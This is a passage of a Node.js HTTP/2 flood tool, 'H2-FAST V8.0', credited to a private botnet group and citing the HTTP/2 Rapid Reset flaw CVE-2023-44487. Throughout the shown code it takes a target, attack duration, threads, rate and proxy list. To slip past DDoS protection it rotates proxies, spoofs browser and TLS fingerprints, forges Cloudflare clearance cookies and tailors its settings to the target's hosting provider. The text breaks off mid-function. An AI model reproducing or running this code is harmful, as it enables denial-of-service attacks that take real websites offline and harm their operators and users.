/*
    H2-FAST V8.0 - MODIFIED (Proxy Format Support)
    Node: v14.x+
    OS: Cross-Platform
    Setup: npm install commander hpack

    Mevic Botnets (Private)
    Developer: @udpraw53 (t.me/udpraw53)
    Modified: Full proxy format support (http://, socks4://, socks5://, https://, ip:port)
*/

const { Command } = require('commander');
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const os = require('os');
const crypto = require('crypto');
const fs = require('fs');
const http = require('http');
const dns = require('dns');

process.on(`uncaughtException`, (e) => { });
process.on(`unhandledRejection`, (e) => { });

const prog = new Command();
prog
    .option('-u, --target <url>', 'Target URL')
    .option('-n, --connections <number>', 'Number of connections', parseInt)
    .option('-s, --time <seconds>', 'Time to run', parseInt)
    .option('-t, --threads <number>', 'Number of threads', parseInt)
    .option('-m, --streams <number>', 'Number of streams', parseInt)
    .option('-p, --proxy <proxy>', 'Proxy configuration')
    .option('-i, --postdata <data>', 'Post data')
    .option('-h, --headerdata <header...>', 'Header data')
    .option('-r, --rate <rate>', 'Rate')
    .option('-c, --cookie <cookie>', 'Cookie')
    .option('-e, --methods <method>', 'HTTP method: GET, POST, HEAD, PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH, RAND', 'GET')
    .option('--cache <true/false>', 'Disable cache header', false)
    .option('--ratelimit <true/false>', 'Ratelimit mode', false)
    .option('--fingerprint <true/false>', 'TLS fingerprint', false)
    .option('--set-cookie <true/false>', 'Enable cookie session handling', false)
    .option('--delay <number>', 'Delay between requests in seconds', parseInt)
    .option('--randrate <true/false>', 'Use random rate between 16-90', false)
    .option('--referer <url>', 'Referer URL (use "rand" for random referer)')
    .option('--http <version>', 'HTTP version: 1 for HTTP/1.1, 2 for HTTP/2')
    .option('--redirect <true/false>', 'Follow redirect URLs', false)
    .option('--extra <true/false>', 'Enable extra headers', false)
    .option('--debug <true/false>', 'Enable debug logging', false)
    .parse(process.argv);

const opts = prog.opts();

function parseBoolean(value) {
    if (typeof value === 'boolean') return value;
    if (typeof value === 'string') {
        return value.toLowerCase() === 'true';
    }
    return false;
}

const cache_opt = parseBoolean(opts.cache);
const ratelimit_opt = parseBoolean(opts.ratelimit);
const fingerprint_opt = parseBoolean(opts.fingerprint);
const cookiesession_opt = parseBoolean(opts.setCookie);
const randrate_opt = parseBoolean(opts.randrate);
const redirect_opt = parseBoolean(opts.redirect);
const extra_opt = parseBoolean(opts.extra);
const debug_opt = parseBoolean(opts.debug);

const delay_opt = Math.min(opts.delay || 0, 5);
const methods_opt = opts.methods || 'GET';
const http_opt = opts.http;

if (!opts.target || !opts.time || !opts.threads || !opts.rate || !opts.proxy) {
    console.log(`
  FAST V8 - CVE-2023-44487 - Last updated 23-11-2025 - developer @udpraw53 for Mevic botnets
  MODIFIED: Full proxy format support (http://, socks4://, socks5://, https://, ip:port)
Usage:
  node fastv7 --target <url> --time <time> --threads <threads> --rate <rate> --proxy <proxyfile>

Required:
  -u, --target    Target URL (https://example.com)
  -s, --time      Attack duration in seconds
  -t, --threads   Number of threads
  -r, --rate      Request rate
  -p, --proxy     Proxy file path

Options:
  -n, --connections   Connections per thread (default: 1)
  -m, --streams       Streams per connection (default: 1)
  -i, --postdata      POST data
  -h, --headerdata    Custom headers (format: header@value)
  -c, --cookie        Cookie string
  -e, --methods       HTTP method: GET/POST/... (default: GET)
  --cache             <true/false> Disable cache header (default: false)
  --ratelimit         <true/false> Ratelimit mode (default: false)
  --fingerprint       <true/false> TLS fingerprint (default: false)
  --set-cookie        <true/false> Enable cookie session handling (default: false)
  --delay             <number> Delay between requests in seconds (max: 5)
  --randrate          <true/false> Use random rate between 16-90 (default: false)
  --referer           <url> Referer URL (use "rand" for random referer)
  --http              <version> HTTP version: 1 for HTTP/1.1, 2 for HTTP/2
  --redirect          <true/false> Follow redirect URLs (default: false)
  --extra             <true/false> Enable extra headers (default: false)
  --debug             <true/false> Enable debug logging (default: false)

Proxy file format supported:
  http://ip:port
  https://ip:port
  socks4://ip:port
  socks5://ip:port
  ip:port (auto detected as HTTP)

    `);
    process.exit(1);
}

const trg = opts.target;
const time = opts.time;
const threads = opts.threads;
const rate = opts.rate || 1;
const connections = opts.connections || 1;
const streams = opts.streams || 1;
const referer_opt = opts.referer;
const pFile = opts.proxy;

if (!fs.existsSync(pFile)) {
    console.log(`Error: Proxy file '${pFile}' not found`);
    process.exit(1);
}

// ==================== MODIFIED: PROXY PARSER (SUPPORT ALL FORMATS) ====================
function parseProxyLine(line) {
    line = line.trim();
    if (!line) return null;

    let protocol = 'http'; // default protocol
    let rest = line;

    // Check for protocol prefix
    const protocolMatch = line.match(/^(https?|socks[45]):\/\/(.+)$/i);
    if (protocolMatch) {
        protocol = protocolMatch[1].toLowerCase();
        rest = protocolMatch[2];
    }

    // Extract IP and Port
    const ipPortMatch = rest.match(/^([^:]+):(\d+)$/);
    if (!ipPortMatch) return null;

    const ip = ipPortMatch[1];
    const port = parseInt(ipPortMatch[2]);

    if (!ip || isNaN(port) || port <= 0 || port > 65535) return null;

    return { protocol, ip, port };
}

const pListRaw = fs.readFileSync(pFile, 'utf8').replace(/\r/g, '').split('\n').filter(p => p.trim());
const pList = [];

for (const line of pListRaw) {
    const proxy = parseProxyLine(line);
    if (proxy) {
        pList.push(proxy);
    } else {
        console.log(`[WARN] Skipping invalid proxy: ${line}`);
    }
}

if (pList.length === 0) {
    console.log(`Error: No valid proxies found in '${pFile}'`);
    console.log(`Supported formats: http://ip:port, https://ip:port, socks4://ip:port, socks5://ip:port, ip:port`);
    process.exit(1);
}

console.log(`[INFO] Loaded ${pList.length} proxies from ${pFile}`);

let trgUrl;
try {
    if (http_opt === '1') {
        trgUrl = new URL(trg.replace(/^https:/, 'http:'));
    } else if (http_opt === '2') {
        trgUrl = new URL(trg.replace(/^http:/, 'https:'));
    } else {
        trgUrl = new URL(trg);
    }
} catch (e) {
    console.log(`Error: Invalid target URL '${trg}'`);
    process.exit(1);
}

const mainStat = [];
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
let statCounts = {};
let pIdx = 0;
let roundRobinIndex = 0;
let globalISPInfo = null;

let currentTargetUrl = trgUrl;
let redirectCount = 0;
const MAX_REDIRECTS = 10;

const cookieStore = new Map();

let proxyStats = pList.map((p, idx) => ({
    p: `${p.protocol}://${p.ip}:${p.port}`,
    protocol: p.protocol,
    ip: p.ip,
    port: p.port,
    failCount: 0,
    successCount: 0,
    priority: 0,
    cookies: new Map()
}));

const BASE64_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';

const colors = {
    reset: '\x1b[0m',
    bright: '\x1b[1m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m',
    white: '\x1b[37m'
};

const browserProfiles = {
    chrome_windows: {
        name: 'Chrome Windows',
        weight: 0.6,
        userAgent: () => {
            const versions = [
                '122.0.6261.39', '122.0.6261.57', '122.0.6261.70',
                '123.0.6312.58', '123.0.6312.86', '123.0.6312.99'
            ];
            const v = versions[Math.floor(Math.random() * versions.length)];
            return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${v} Safari/537.36`;
        },
        accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        acceptEncoding: ['gzip, deflate, br', 'gzip, deflate, br, zstd'],
        secHeaders: {
            'sec-ch-ua': [
                `"Chromium";v="122", "Google Chrome";v="122", "Not=A?Brand";v="24"`,
                `"Not_A Brand";v="8", "Chromium";v="122", "Google Chrome";v="122"`,
                `"Google Chrome";v="123", "Chromium";v="123", "Not.A/Brand";v="8"`
            ],
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"15.0.0"'
        },
        tlsProfile: {
            ciphers: [
                'TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256',
                'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256',
                'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384',
                'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305'
            ].join(':'),
            curves: 'X25519:secp256r1:secp384r1'
        },
        behavior: {
            priorityHeader: true,
            teHeader: false,
            dntProbability: 0.1,
            secGpcProbability: 0.8,
            prefetchProbability: 0.15,
            cookieProbability: 0.95
        }
    },
    chrome_mac: {
        name: 'Chrome macOS',
        weight: 0.25,
        userAgent: () => {
            const versions = [
                '122.0.6261.39', '122.0.6261.57', '122.0.6261.70',
                '123.0.6312.58', '123.0.6312.86'
            ];
            const v = versions[Math.floor(Math.random() * versions.length)];
            const macVersions = ['10_15_7', '11_7_10', '12_6_8', '13_5_1', '14_3_1'];
            const macVersion = macVersions[Math.floor(Math.random() * macVersions.length)];
            return `Mozilla/5.0 (Macintosh; Intel Mac OS X ${macVersion}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${v} Safari/537.36`;
        },
        accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        acceptEncoding: ['gzip, deflate, br', 'gzip, deflate, br, zstd'],
        secHeaders: {
            'sec-ch-ua': [
                `"Chromium";v="122", "Google Chrome";v="122", "Not=A?Brand";v="24"`,
                `"Google Chrome";v="123", "Chromium";v="123", "Not.A/Brand";v="8"`
            ],
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"macOS"',
            'sec-ch-ua-platform-version': '"14.0.0"'
        },
        tlsProfile: {
            ciphers: [
                'TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256',
                'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256',
                'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384',
                'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305'
            ].join(':'),
            curves: 'X25519:secp256r1:secp384r1'
        },
        behavior: {
            priorityHeader: true,
            teHeader: false,
            dntProbability: 0.15,
            secGpcProbability: 0.7,
            prefetchProbability: 0.1,
            cookieProbability: 0.9
        }
    },
    firefox_windows: {
        name: 'Firefox Windows',
        weight: 0.1,
        userAgent: () => {
            const versions = ['121.0', '122.0', '123.0', '124.0'];
            const v = versions[Math.floor(Math.random() * versions.length)];
            return `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${v}) Gecko/20100101 Firefox/${v}`;
        },
        accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        acceptEncoding: ['gzip, deflate, br'],
        secHeaders: {
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1'
        },
        tlsProfile: {
            ciphers: [
                'TLS_AES_128_GCM_SHA256', 'TLS_CHACHA20_POLY1305_SHA256', 'TLS_AES_256_GCM_SHA384',
                'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256',
                'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384',
                'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305'
            ].join(':'),
            curves: 'X25519:secp256r1:secp384r1:secp521r1'
        },
        behavior: {
            priorityHeader: false,
            teHeader: true,
            dntProbability: 0.3,
            secGpcProbability: 0.6,
            prefetchProbability: 0.05,
            cookieProbability: 0.85
        }
    },
    safari_mac: {
        name: 'Safari macOS',
        weight: 0.05,
        userAgent: () => {
            const webkitVersions = ['605.1.15', '606.1.36', '607.1.40'];
            const safariVersions = ['16.6', '17.0', '17.1'];
            const webkit = webkitVersions[Math.floor(Math.random() * webkitVersions.length)];
            const safari = safariVersions[Math.floor(Math.random() * safariVersions.length)];
            const macVersions = ['10_15_7', '11_7_10', '12_6_8', '13_5_1', '14_3_1'];
            const macVersion = macVersions[Math.floor(Math.random() * macVersions.length)];
            return `Mozilla/5.0 (Macintosh; Intel Mac OS X ${macVersion}) AppleWebKit/${webkit} (KHTML, like Gecko) Version/${safari} Safari/${webkit}`;
        },
        accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        acceptEncoding: ['gzip, deflate, br'],
        secHeaders: {
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1'
        },
        tlsProfile: {
            ciphers: [
                'TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256',
                'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256',
                'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384'
            ].join(':'),
            curves: 'X25519:secp256r1:secp384r1:secp521r1'
        },
        behavior: {
            priorityHeader: false,
            teHeader: false,
            dntProbability: 0.2,
            secGpcProbability: 0.5,
            prefetchProbability: 0.02,
            cookieProbability: 0.8
        }
    }
};

function getRandomBrowserProfile() {
    const profiles = Object.values(browserProfiles);
    const random = Math.random();
    let cumulativeWeight = 0;

    for (const profile of profiles) {
        cumulativeWeight += profile.weight;
        if (random <= cumulativeWeight) {
            return profile;
        }
    }
    return browserProfiles.chrome_windows;
}

let currentBrowserProfile = null;

function getStatusCodeColor(code) {
    if (!code) return colors.white;

    const firstDigit = code.charAt(0);
    switch (firstDigit) {
        case '2': return colors.green;
        case '3': return colors.yellow;
        case '4': return colors.red;
        case '5': return colors.green;
        default: return colors.white;
    }
}

function random_int(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function random_char(length) {
    let result = '';
    for (let i = 0; i < length; i++) {
        result += BASE64_CHARS.charAt(Math.floor(Math.random() * BASE64_CHARS.length));
    }
    return result;
}

function get_cloudflare_timestamp() {
    const now = Date.now();
    return Math.floor(now / 1000);
}

function generate_cf_cookie_value(length, includeTimestamp = false) {
    let result = '';
    const part1Length = Math.floor(length * 0.6);
    for (let i = 0; i < part1Length; i++) {
        result += BASE64_CHARS.charAt(Math.floor(Math.random() * BASE64_CHARS.length));
    }

    if (includeTimestamp) {
        result += '-' + get_cloudflare_timestamp();
        const part2Length = length - part1Length - 10;
        for (let i = 0; i < part2Length; i++) {
            result += BASE64_CHARS.charAt(Math.floor(Math.random() * BASE64_CHARS.length));
        }
    }
    return result;
}

function generate_cf_bm_cookie() {
    const timestamp = get_cloudflare_timestamp();
    const part1 = generate_cf_cookie_value(43, false);
    const part2 = generate_cf_cookie_value(28, false);
    return `__cf_bm=${part1}-${timestamp}-0-${part2}`;
}

function generate_cf_clearance_cookie() {
    const timestamp = get_cloudflare_timestamp();
    const part1 = generate_cf_cookie_value(15, false);
    const part2 = generate_cf_cookie_value(43, false);
    const part3 = generate_cf_cookie_value(35, false);
    const part4 = generate_cf_cookie_value(205, false);
    const part5 = generate_cf_cookie_value(51, false);
    const part6 = generate_cf_cookie_value(30, false);
    const part7 = generate_cf_cookie_value(17, false);
    return `cf_clearance=${part1}_${part2}-${timestamp}-1.2.1.1-${part3}.${part4}.${part5}.${part6}.${part7}`;
}

function generate_regular_cookies_realistic() {
    const cookies = [];
    const cookiePatterns = [
        { name: 'sessionid', value: () => `session_${random_char(32)}_${Date.now().toString(36)}` },
        { name: 'token', value: () => `tok_${random_char(24)}_${Math.random().toString(36).substr(2, 9)}` },
        { name: 'auth', value: () => `auth_${random_char(16)}_${get_cloudflare_timestamp().toString(36)}` },
        { name: 'user_id', value: () => `user_${Math.floor(Math.random() * 10000)}_${random_char(8)}` }
    ];

    const numCookies = random_int(2, 4);
    const usedNames = new Set();

    for (let i = 0; i < numCookies; i++) {
        let pattern;
        do {
            pattern = cookiePatterns[random_int(0, cookiePatterns.length - 1)];
        } while (usedNames.has(pattern.name));

        usedNames.add(pattern.name);
        cookies.push(`${pattern.name}=${pattern.value()}`);
    }
    return cookies.join('; ');
}

function generate_cloudflare_cookies_enhanced(pathname = '/', hostname = currentTargetUrl.hostname) {
    const cookies = [];
    const timestamp = get_cloudflare_timestamp();

    const cfBmValue = generate_cf_bm_cookie();
    cookies.push(cfBmValue.split(';')[0]);

    if (Math.random() < 0.8) {
        const cfClearanceValue = generate_cf_clearance_cookie();
        cookies.push(cfClearanceValue.split(';')[0]);
    }

    return cookies.join('; ');
}

function parse_set_cookie_enhanced(header, domain) {
    if (!header) return null;

    try {
        const parts = header.split(';').map(part => part.trim());
        const [nameValue, ...attributes] = parts;
        const [name, value] = nameValue.split('=');

        if (name && value) {
            if (!cookieStore.has(domain)) {
                cookieStore.set(domain, new Map());
            }

            const cookieData = { value: value, attributes: {} };
            attributes.forEach(attr => {
                const [attrName, attrValue] = attr.split('=');
                if (attrName && attrValue) {
                    cookieData.attributes[attrName.toLowerCase()] = attrValue;
                } else if (attrName) {
                    cookieData.attributes[attrName.toLowerCase()] = true;
                }
            });

            cookieStore.get(domain).set(name, cookieData);
            return { name, value, attributes: cookieData.attributes };
        }
    } catch (e) { }
    return null;
}

function get_cookies_for_domain_enhanced(domain) {
    if (!cookieStore.has(domain)) return '';
    const cookies = cookieStore.get(domain);
    const cookieStrings = [];

    for (const [name, cookieData] of cookies) {
        if (cookieData.attributes.expires) {
            const expires = new Date(cookieData.attributes.expires);
            if (expires < new Date()) {
                cookies.delete(name);
                continue;
            }
        }

        if (cookieData.attributes['max-age']) {
            const maxAge = parseInt(cookieData.attributes['max-age']);
            if (maxAge <= 0) {
                cookies.delete(name);
                continue;
            }
        }

        cookieStrings.push(`${name}=${cookieData.value}`);
    }
    return cookieStrings.join('; ');
}

function get_cookie_header_enhanced() {
    if (opts.cookie) return opts.cookie;

    if (cookiesession_opt) {
        const sessionCookies = get_cookies_for_domain_enhanced(currentTargetUrl.hostname);
        if (sessionCookies) return sessionCookies;
    }

    const isCloudflareTarget =
        (globalISPInfo && globalISPInfo.isCloudflare) ||
        currentTargetUrl.hostname.includes('cloudflare') ||
        currentTargetUrl.hostname.endsWith('.pages.dev');

    if (isCloudflareTarget) {
        return generate_cloudflare_cookies_enhanced();
    } else {
        return generate_regular_cookies_realistic();
    }
}

function handle_set_cookie_response(headers, domain) {
    if (!cookiesession_opt) return;
    const setCookieHeaders = headers.filter(x => x[0] === 'set-cookie');

    for (const header of setCookieHeaders) {
        if (header[1]) {
            parse_set_cookie_enhanced(header[1], domain);
        }
    }
}

const SECURE_OPTIONS =
    crypto.constants.SSL_OP_NO_RENEGOTIATION |
    crypto.constants.SSL_OP_NO_TICKET |
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_COMPRESSION |
    crypto.constants.SSL_OP_NO_RENEGOTIATION |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_TLSEXT_PADDING |
    crypto.constants.SSL_OP_ALL;

const HTTP_METHODS = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH'];

function get_http_method() {
    if (methods_opt === 'RAND') {
        return HTTP_METHODS[Math.floor(Math.random() * HTTP_METHODS.length)];
    }
    return methods_opt;
}

function getALPNProtocols() {
    return http_opt === '1' ? ['http/1.1'] :
        http_opt === '2' ? ['h2'] :
            ['h2', 'http/1.1'];
}

const ciphers = [
    'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256', 'TLS_AES_128_GCM_SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305',
    'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256',
    'DHE-RSA-AES256-GCM-SHA384', 'DHE-RSA-AES128-GCM-SHA256',
    'AES256-GCM-SHA384', 'AES128-GCM-SHA256'
];

const sigalgs = ['ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256', 'rsa_pkcs1_sha256', 'ecdsa_secp384r1_sha384'];
const curves = ['X25519', 'secp256r1', 'secp384r1'];

const TLS_CIPHERS = {
    TLS13: ['TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256', 'TLS_AES_128_GCM_SHA256'],
    ECDHE: [
        'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-CHACHA20-POLY1305',
        'ECDHE-RSA-CHACHA20-POLY1305', 'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256'
    ],
    DHE: ['DHE-RSA-AES256-GCM-SHA384', 'DHE-RSA-AES128-GCM-SHA256'],
    LEGACY: ['AES256-GCM-SHA384', 'AES128-GCM-SHA256']
};

const randomReferers = [
    'https://www.google.com/', 'https://www.facebook.com/', 'https://www.youtube.com/',
    'https://www.amazon.com/', 'https://www.reddit.com/', 'https://www.twitter.com/',
    'https://www.instagram.com/', 'https://www.linkedin.com/', 'https://www.github.com/',
    'https://www.stackoverflow.com/', 'https://www.wikipedia.org/', 'https://www.bing.com/'
];

function get_random_referer() {
    return randomReferers[Math.floor(Math.random() * randomReferers.length)];
}

function get_referer() {
    if (referer_opt === 'rand') {
        return get_random_referer();
    } else if (referer_opt) {
        return referer_opt;
    }
    return null;
}

function handle_redirect(headers) {
    if (!redirect_opt) return false;
    const locationHeader = headers.find(x => x[0] == 'location');

    if (locationHeader && locationHeader[1]) {
        try {
            const newUrl = new URL(locationHeader[1], currentTargetUrl);
            if (!newUrl.hostname || !newUrl.protocol) return false;

            currentTargetUrl = newUrl;
            redirectCount++;
            return true;
        } catch (e) {
            return false;
        }
    }
    return false;
}

function shuffle_tls_settings() {
    const shuffled_ciphers = [...ciphers].sort(() => Math.random() - 0.5).slice(0, Math.floor(Math.random() * (ciphers.length - 5 + 1)) + 5);
    const shuffled_sigalgs = [...sigalgs].sort(() => Math.random() - 0.5).slice(0, Math.floor(Math.random() * (sigalgs.length - 2 + 1)) + 2);
    const shuffled_curves = [...curves].sort(() => Math.random() - 0.5).slice(0, Math.floor(Math.random() * (curves.length - 1 + 1)) + 1);

    return { shuffled_ciphers, shuffled_sigalgs, shuffled_curves };
}

function get_current_rate() {
    if (randrate_opt) return random_int(16, 90);
    return rate;
}

const ispProfiles = {
    google: {
        name: 'Google',
        match: ['google', 'google llc', 'google cloud', 'gstatic', 'youtube'],
        tls: {
            minVersion: 'TLSv1.2', maxVersion: 'TLSv1.3',
            ciphers: [...TLS_CIPHERS.TLS13, ...TLS_CIPHERS.ECDHE, 'AES256-GCM-SHA384', 'AES128-GCM-SHA256'].join(':'),
            ALPNProtocols: getALPNProtocols(), honorCipherOrder: false, secureOptions: SECURE_OPTIONS
        },
        settings: [[1, 65536], [2, 0], [3, 1000], [4, 16777215], [5, 16384], [6, 262144]]
    },
    cloudflare: {
        name: 'Cloudflare',
        match: ['cloudflare', 'cloudflare inc'],
        tls: {
            minVersion: 'TLSv1.2', maxVersion: 'TLSv1.3',
            ciphers: [...TLS_CIPHERS.TLS13, 'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305'].join(':'),
            ALPNProtocols: getALPNProtocols(), honorCipherOrder: false, secureOptions: SECURE_OPTIONS | crypto.constants.SSL_OP_NO_TICKET
        },
        settings: [[1, 65536], [2, 0], [3, 100], [4, 65535], [5, 16384], [6, 65536]]
    },
    akamai: {
        name: 'Akamai', match: ['akamai', 'akamai technologies'],
        tls: {
            minVersion: 'TLSv1.2', maxVersion: 'TLSv1.3',
            ciphers: [...TLS_CIPHERS.TLS13, ...TLS_CIPHERS.ECDHE, ...TLS_CIPHERS.DHE, 'AES256-GCM-SHA384', 'AES128-GCM-SHA256'].join(':'),
            ALPNProtocols: getALPNProtocols(), honorCipherOrder: false, secureOptions: SECURE_OPTIONS
        },
        settings: [[1, 32768], [2, 1], [3, 128], [4, 131072], [5, 32768], [6, 65536]]
    },
    amazon: {
        name: 'Amazon', match: ['amazon', 'amazon.com', 'amazon technologies', 'aws'],
        tls: {
            minVersion: 'TLSv1.2', maxVersion: 'TLSv1.3',
            ciphers: [...TLS_CIPHERS.TLS13, 'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-AES128-SHA256', 'ECDHE-RSA-AES128-SHA256', 'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384', 'AES128-GCM-SHA256', 'AES256-GCM-SHA384'].join(':'),
            ALPNProtocols: getALPNProtocols(), honorCipherOrder: false, secureOptions: SECURE_OPTIONS
        },
        settings: [[1, 8192], [2, 1], [3, 128], [4, 65535], [5, 16384], [6, 16384]]
    },
    default: {
        name: 'Default', match: [],
        tls: {
            minVersion: 'TLSv1.2', maxVersion: 'TLSv1.3',
            ciphers: [...TLS_CIPHERS.TLS13, ...TLS_CIPHERS.ECDHE, ...TLS_CIPHERS.DHE, ...TLS_CIPHERS.LEGACY, '!aNULL', '!eNULL', '!EXPORT', '!DES', '!RC4', '!3DES', '!MD5', '!PSK'].join(':'),
            ALPNProtocols: getALPNProtocols(), honorCipherOrder: false, secureOptions: SECURE_OPTIONS
        },
        settings: [[1, 4096], [2, 0], [3, 100], [4, 65535], [5, 16384], [6, 65536]]
    }
};

const detectTargetProfile = (targetUrl) => {
    const hostname = targetUrl.hostname.toLowerCase();
    if (hostname.includes('google') || hostname.includes('gstatic') || hostname.includes('youtube')) return 'google';
    if (hostname.includes('cloudflare') || hostname.endsWith('.pages.dev')) return 'cloudflare';
    if (hostname.includes('amazon') || hostname.includes('aws')) return 'amazon';
    if (hostname.includes('akamai')) return 'akamai';
    return 'default';
};

const detectTargetISP = async (targetUrl) => {
    return new Promise((resolve) => {
        dns.lookup(targetUrl.hostname, (err, targetIP, family) => {
            if (err) { resolve(null); return; }

            const ispOptions = {
                hostname: 'ip-api.com', port: 80,
                path: `/json/${targetIP}?fields=status,message,isp,org,country,countryCode,as`,
                method: 'GET', timeout: 10000
            };

            const ispReq = http.request(ispOptions, (ispRes) => {
                let ispData = '';
                ispRes.on('data', (chunk) => ispData += chunk);
                ispRes.on('end', () => {
                    try {
                        const ispInfo = JSON.parse(ispData);
                        if (ispInfo.status === 'success') {
                            globalISPInfo = ispInfo;
                            const isCloudflareISP =
                                (ispInfo.isp && ispInfo.isp.toLowerCase().includes('cloudflare')) ||
                                (ispInfo.org && ispInfo.org.toLowerCase().includes('cloudflare')) ||
                                (ispInfo.as && ispInfo.as.includes('13335'));
                            ispInfo.isCloudflare = isCloudflareISP;
                            resolve(ispInfo);
                        } else resolve(null);
                    } catch (e) { resolve(null); }
                });
            });

            ispReq.on('error', () => resolve(null));
            ispReq.on('timeout', () => { ispReq.destroy(); resolve(null); });
            ispReq.end();
        });
    });
};

const detectTargetProfileFromURL = (targetUrl, ispInfo) => {
    const urlProfile = detectTargetProfile(targetUrl);
    if (urlProfile !== 'default') return ispProfiles[urlProfile];

    if (ispInfo && ispInfo.isCloudflare) return ispProfiles.cloudflare;
    if (ispInfo && ispInfo.isp) {
        const ispLower = ispInfo.isp.toLowerCase();
        if (ispLower.includes('cloudflare')) return ispProfiles.cloudflare;
        if (ispLower.includes('google')) return ispProfiles.google;
        if (ispLower.includes('amazon') || ispLower.includes('aws')) return ispProfiles.amazon;
        if (ispLower.includes('akamai')) return ispProfiles.akamai;
    }
    return ispProfiles.default;
};

const getConfiguration = async () => {
    const ispInfo = await detectTargetISP(currentTargetUrl);
    const profile = detectTargetProfileFromURL(currentTargetUrl, ispInfo);

    if (fingerprint_opt) {
        const { shuffled_ciphers, shuffled_sigalgs, shuffled_curves } = shuffle_tls_settings();
        return {
            ...profile, ispInfo: ispInfo,
            tls: {
                ...profile.tls,
                ciphers: shuffled_ciphers.join(':') + ':!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
                ...(Math.random() < 0.50 ? { sigalgs: shuffled_sigalgs.join(':') } : {}),
                ecdhCurve: shuffled_curves.join(':'),
                ALPNProtocols: getALPNProtocols()
            }
        };
    }
    return { ...profile, ispInfo: ispInfo };
};

const BufWin = (val) => {
    const buf = Buffer.alloc(4);
    buf.writeUInt32BE(val, 0);
    return buf;
};

const AdvancedFingerprint = {
    generateAdvancedJA3() {
        const versions = ['771', '772', '773'];
        const ciphers = ['4865', '4866', '4867', '49195', '49199', '49196', '49200', '52393', '52392', '49171', '49172', '156', '157', '47', '53', '49170', '49169', '49168', '49167', '49166', '49165', '49164', '10', '19', '20', '21', '22', '23', '24', '25', '26', '27'];
        const extensions = ['0', '5', '10', '11', '13', '16', '18', '23', '27', '35', '43', '45', '51', '17513', '65281', '65037', '65038', '65039', '30031', '30032', '13172', '21', '41', '49', '50'];
